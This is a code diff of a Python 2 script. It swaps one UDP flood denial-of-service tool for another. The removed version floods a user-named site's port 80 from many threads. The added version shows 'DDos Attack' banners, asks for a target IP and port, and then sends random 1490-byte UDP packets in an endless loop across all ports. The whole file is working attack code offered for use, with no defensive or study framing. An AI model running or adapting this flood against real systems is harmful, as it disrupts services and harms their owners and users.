@@ -1,64 +1,59 @@
-print(" amir ")
-print(" * keristofer * ")
-import os 
-os.system("pip install datetime")
+
+import sys
+import os
 import time
 import socket
-import sys
-import datetime
-import thread 
-x = str(datetime.datetime.now())
-x = """
-	   
-	   
-    ______________________________________
-    |                                     |    
-    |       A M I R                       |
-    |                                     |
-    |                                     |
-    |              <keristofer/>          |
-    |                                     |
-    |                                     |
-    |          pedar filtering            |
-    |                                     |
-    |                                     |
-    |  chanel rubuka = @aqa_keristofer    |
-    |                                     |
-    |       no love                       |
-    |                                     |
-    |     abar script ddos                |
-    |                                     |
-    |                                     |
-    |   amir [ keristofer ]               |
-    |_____________________________________|
-	      
-     
-	      """
-for c in x:
-      sys.stdout.write(c)
-      sys.stdout.flush()
-      time.sleep(0.02)     
-site = raw_input("Enter the site address => ")
-thread_count = input("Enter your thread => ")
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
 
-ip = socket.gethostbyname(site)
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+##############
 
-UDP_PORT = 80
-MESSAGE = "ViRus32"
-print("UDP target IP:")
-print("UDP target port:"), UDP_PORT
+os.system("clear")
+os.system("figlet DDos Attack")
+print("")
+print("")
+print("")
+os.system("figlet k e r i s t o f e r")
+print("")
+print("")
+
+ip = raw_input("IP Target : ")
+port = input("Port       : ")
+
+os.system("clear")
+os.system("figlet Attack Starting")
+print("")
+print("")
+print("[                    ] 0% ")
+time.sleep(5)
+print("[=====               ] 25%")
+time.sleep(5)
+print("[==========          ] 50%")
+time.sleep(5)
+print ("[===============     ] 75%")
+time.sleep(5)
+print ("[====================] 100%")
 time.sleep(3)
-
-def dos(i):
-        while True:
-                   sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                   sock.sendto(MESSAGE, (ip, UDP_PORT))
-                   print " *Packet Sent* " 		
-
-for i in xrange(thread_count):
-         try:
-          thread.start_new_thread( dos , ("Thread-"+str(i),) )
-         except KeyboardInterrupt:
-                   sys.exit(0)
-while 1:
-   pass
+print("")
+print("")
+os.system("figlet run")
+time.sleep(3)
+print("")
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print("Sent %s packet to %s throught port:%s")%(sent,ip,port)
+     if port == 65534:
+       port = 1
